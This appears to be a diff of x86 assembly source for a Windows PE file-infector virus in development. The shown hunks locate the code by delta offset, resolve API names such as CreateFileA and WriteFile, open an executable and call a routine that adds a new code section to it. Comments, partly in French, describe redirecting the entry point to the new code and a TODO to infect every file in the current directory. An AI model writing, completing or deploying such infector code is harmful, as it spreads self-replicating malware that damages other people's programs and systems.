@@ -72,16 +72,6 @@ deltaoffset:
 ; STEP 5 -> verify with echo %errorlevel% it should print 2 in this case
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-    ; TODO: foreach file in current dir
-
-    ; TODO: routine to open a file and
-    ; si ya la place pour une nouvelle section, la creer
-    ; et modifier le point d'entree pour pointer dessus
-    ; retourne le point d'entree precedent
-    ; puis fait un seek() sur file a l'endroit ou le nouveau
-    ; code ira
-    ; OU retourner NULL
-
     ; Get CreateFile addr
     mov     eax,ebp
     add     eax,offset CreateFile_b
@@ -93,7 +83,8 @@ deltaoffset:
     nop
     nop
 
-    ; Open a file (eax)
+    ; TODO: foreach file in current dir
+    ; Open a file (TODO: use each file)
     push    0 ; attr template
     push    FILE_ATTRIBUTE_NORMAL
     push    OPEN_EXISTING
@@ -105,15 +96,15 @@ deltaoffset:
     sub     ebx,offset deltaoffset
     push    ebx ; .exe path
     call    eax ; CreateFile()
-
-    call exit_success ; WIP
    
     ; Create a new section
-    push    eax ; File descriptor for donothing_2.exe
+    push    eax ; File descriptor
     push    ebx ; Delta offset
     push    edi ; PE header
     push    esi ; DOS header
     call new_code_section
+
+    call exit_success
     
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ; Create a new code section in the executable
@@ -680,11 +671,10 @@ _data:
 
    FindFirstFile_b db  "FindFirstFileA",0
    FindNextFile_b  db  "FindNextFileA",0
-   CreateFile_b    db  "CreateFileA",0
    ExitProcess_b   db  "ExitProcess",0
    Beep_b          db  "Beep",0
    CreateFile_b    db  "CreateFileA",0
-   WriteFIle_b     db  "WriteFile",0
+   WriteFile_b     db  "WriteFile",0
 
 jambi_end:
 end start
